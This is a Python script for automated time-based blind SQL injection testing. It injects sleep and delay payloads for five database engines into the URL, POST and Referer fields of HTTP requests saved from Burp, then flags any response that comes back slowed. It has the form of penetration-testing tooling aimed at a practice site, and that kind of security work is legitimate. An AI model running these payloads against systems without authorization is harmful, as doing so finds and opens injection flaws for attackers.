import os
import time
import requests
import urllib.parse
import logging
import time
from requests.exceptions import Timeout
import warnings
from urllib3.exceptions import InsecureRequestWarning

# Suppress InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

def send_request_with_retry(request_info, retries=3, delay=5):
    for attempt in range(retries):
        try:
            response = requests.request(
                method=request_info["method"],
                url=request_info["url"],
                headers=request_info["headers"],
                data=request_info.get("data", None),
                timeout=10,
                verify=False
            )
            return response
        except Timeout as e:
            if attempt < retries - 1:
                time.sleep(delay)  # Wait before retrying
                continue
            else:
                logger.error("Max retries exceeded. Timeout error: %s", e)
                return None
# Configuration
REQUEST_DIR = "burp_requests"  # Directory where your .txt request files are saved
OUTPUT_DIR = "vulnerable_requests"  # Directory to save flagged vulnerable requests
WAIT_TIME = [1, 2, 3]  # Seconds to test for delays

# Delay payloads for various databases (SQL injection techniques)
DELAY_PAYLOADS = {
    "mysql": "' OR SLEEP({time})--",
    "postgresql": "'; SELECT pg_sleep({time});--",
    "mssql": "'; WAITFOR DELAY '0:0:{time}';--",
    "oracle": "'; BEGIN DBMS_LOCK.SLEEP({time}); END;--",
    "sqlite": "' OR 1=1 AND randomblob(1000000000);--"
}

# Set up logging
LOG_FILE = "sql_injection_test.log"
logging.basicConfig(level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler(LOG_FILE),
                        logging.StreamHandler()  # Also log to the console
                    ])
logger = logging.getLogger()

# Ensure the output directory exists
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def extract_target_url(request_raw):
    """
    Extract the full target URL (with schema) from the raw HTTP request.
    """
    lines = request_raw.split("\n")
    try:
        method, url, _ = lines[0].split(" ", 2)  # Split only into method, URL, and HTTP version
    except ValueError as e:
        logger.error("Malformed request line: %s", lines[0])
        return None, None, None

    if not url.startswith(('http://', 'https://')):
        base_url = "http://testasp.vulnweb.com/"  # Update with a valid base URL if needed
        url = base_url + url  # Combine base URL with the relative URL

    return url, method, lines[1:]

def parse_query_parameters(url):
    """
    Extract parameters from the URL query string.
    """
    url_parts = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(url_parts.query)
    return query_params

def parse_post_body(body):
    """
    Parse the body of a POST request for form data.
    """
    body_params = urllib.parse.parse_qs(body)
    return body_params

def inject_sql_payloads(url, body, method, headers):
    """
    Injects delay-based SQL payloads into detected parameters in the URL and POST body.
    """
    modified_requests = []
    
    # Parse URL parameters
    query_params = parse_query_parameters(url)

    # Inject delay payloads into URL parameters
    for db, payload_template in DELAY_PAYLOADS.items():
        for wait in WAIT_TIME:
            payload = payload_template.format(time=wait)

            # Inject into URL parameters
            for param in query_params:
                query_params[param] = [payload]

            # Reconstruct the URL with the injected payloads
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            new_url = urllib.parse.urlunparse((urllib.parse.urlparse(url).scheme,
                                               urllib.parse.urlparse(url).netloc,
                                               urllib.parse.urlparse(url).path,
                                               "", new_query, ""))

            # Modify the headers if necessary (e.g., add Referer header with the payload)
            headers_with_referer = headers.copy()
            headers_with_referer["Referer"] = f"https://test-referer.com{payload}"

            # Prepare modified GET request
            modified_request = {
                "method": method,
                "url": new_url,
                "headers": headers_with_referer,
                "data": None
            }

            modified_requests.append(modified_request)

    if method == "POST" and body:
        # Parse POST body parameters and inject payloads into each parameter
        body_params = parse_post_body(body)
        for db, payload_template in DELAY_PAYLOADS.items():
            for wait in WAIT_TIME:
                payload = payload_template.format(time=wait)

                # Inject payloads into POST body parameters
                for param in body_params:
                    body_params[param] = [payload]

                # Reconstruct the body
                new_body = urllib.parse.urlencode(body_params, doseq=True)

                # Create the POST request with the injected payloads
                modified_request = {
                    "method": method,
                    "url": url,
                    "headers": headers,
                    "data": new_body
                }

                modified_requests.append(modified_request)

    return modified_requests

def send_request(request_info):
    """
    Sends the HTTP request and checks for delay-based vulnerabilities.
    """
    method = request_info["method"]
    url = request_info["url"]
    headers = request_info["headers"]
    data = request_info.get("data", None)

    try:
        logger.debug("Sending request to %s with method %s", url, method)
        start_time = time.time()
        response = requests.request(
            method=method,  # Use the request method from the original request
            url=url,
            headers=headers,
            data=data,
            timeout=30,  # Increase timeout to 30 seconds
            verify=False  # Disable SSL verification for testing
        )
        elapsed_time = time.time() - start_time
        return elapsed_time
    except requests.exceptions.RequestException as e:
        logger.error("Error sending request: %s", e)
        return None

def test_sql_injection(request_raw, request_file):
    """
    Test each HTTP request for delay-based SQL injection vulnerability.
    """
    target_url, method, request_lines = extract_target_url(request_raw)
    if not target_url:
        logger.error("Could not extract target URL. Skipping request.")
        return None

    headers = {}
    body = None

    for line in request_lines:
        if ":" in line:
            key, value = line.split(":", 1)
            headers[key.strip()] = value.strip()
        elif line.strip() == "":
            break

    if "\n\n" in request_raw:
        body = request_raw.split("\n\n", 1)[1]

    modified_requests = inject_sql_payloads(target_url, body, method, headers)

    for modified_request in modified_requests:
        elapsed_time = send_request(modified_request)
        if elapsed_time and elapsed_time >= max(WAIT_TIME):
            logger.info("[Potential Vulnerability] Delay detected for %s", target_url)
            output_file = os.path.join(OUTPUT_DIR, f"vulnerable_request_{os.path.basename(request_file)}.txt")
            with open(output_file, "w") as out_f:
                out_f.write(f"Original Request File: {request_file}\n\n")
                out_f.write(str(modified_request))
            return output_file

    return None

def main():
    """
    Main script execution.
    """
    request_files = [os.path.join(REQUEST_DIR, f) for f in os.listdir(REQUEST_DIR) if f.endswith(".txt")]

    if not request_files:
        logger.warning("No .txt request files found in %s. Exiting.", REQUEST_DIR)
        return

    vulnerable_requests = []
    logger.info("Testing for delay-based SQL injection vulnerabilities...")
    for request_file in request_files:
        with open(request_file, "r") as f:
            request_raw = f.read()

        result = test_sql_injection(request_raw, request_file)
        if result:
            vulnerable_requests.append(result)

    if vulnerable_requests:
        logger.info("\nVulnerable Requests:")
        for vr in vulnerable_requests:
            logger.info("- %s", vr)
    else:
        logger.info("\nNo vulnerabilities detected.")

if __name__ == "__main__":
    main()
